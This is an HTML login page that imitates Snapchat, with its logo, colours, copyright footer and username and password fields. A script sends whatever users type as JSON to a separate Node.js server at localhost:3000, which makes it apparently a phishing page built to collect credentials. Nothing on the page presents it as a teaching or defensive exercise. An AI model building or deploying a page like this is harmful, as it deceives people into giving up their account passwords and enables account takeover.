<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login | Snapchat</title>
    <style>
        /* Global Styles */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: Arial, sans-serif;
        }

        body {
            background-color: #FFFC00;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
        }

        /* Header */
        .header {
            width: 100%;
            background: #000;
            color: white;
            padding: 15px 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            position: fixed;
            top: 0;
            left: 0;
            z-index: 1000;
        }

        .header img {
            height: 40px;
        }

        .header nav a {
            color: white;
            text-decoration: none;
            margin: 0 15px;
            font-size: 16px;
        }

        /* Login Container */
        .login-container {
            background: white;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
            text-align: center;
            width: 100%;
            max-width: 360px;
            margin-top: 80px;
        }

        .login-container h2 {
            margin-bottom: 20px;
            color: #333;
        }

        .input-field {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 5px;
            font-size: 16px;
        }

        .login-btn {
            width: 100%;
            padding: 12px;
            background-color: #FFFC00;
            border: none;
            border-radius: 5px;
            font-size: 18px;
            cursor: pointer;
            margin-top: 10px;
            transition: background 0.3s;
        }

        .login-btn:hover {
            background-color: #e6e600;
        }

        /* Footer */
        .footer {
            width: 100%;
            text-align: center;
            padding: 15px;
            position: fixed;
            bottom: 0;
            left: 0;
            background: #000;
            color: white;
            font-size: 14px;
        }

        .footer a {
            color: yellow;
            text-decoration: none;
            margin: 0 10px;
        }

        /* Responsive */
        @media (max-width: 480px) {
            .login-container {
                width: 90%;
            }
            .header nav {
                display: none;
            }
        }
    </style>
</head>
<body>

    <!-- Header -->
    <div class="header">
        <img src="https://upload.wikimedia.org/wikipedia/en/thumb/c/c4/Snapchat_logo.svg/1920px-Snapchat_logo.svg.png" alt="Snapchat Logo">
        <nav>
            <a href="#">Home</a>
            <a href="#">Support</a>
            <a href="#">Sign Up</a>
        </nav>
    </div>

    <!-- Login Box -->
    <div class="login-container">
        <h2>Login to Snapchat</h2>
        <input type="text" id="username" class="input-field" placeholder="Username" required>
        <input type="password" id="password" class="input-field" placeholder="Password" required>
        <button class="login-btn" onclick="submitForm()">Login</button>
    </div>

    <!-- Footer -->
    <div class="footer">
        Â© 2025 Snapchat | <a href="#">Privacy Policy</a> | <a href="#">Terms</a>
    </div>

    <script>
        function submitForm() {
            let username = document.getElementById("username").value;
            let password = document.getElementById("password").value;
    
            if (username === "" || password === "") {
                alert("Please enter both username and password.");
                return;
            }
    
            // Send data to Node.js server
            fetch("http://localhost:3000/login", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ username, password })
            })
            .then(response => response.json())
            .then(data => {
                alert(data.message);
            })
            .catch(error => {
                console.error("Error:", error);
            });
        }
    </script>
    

</body>
</html>
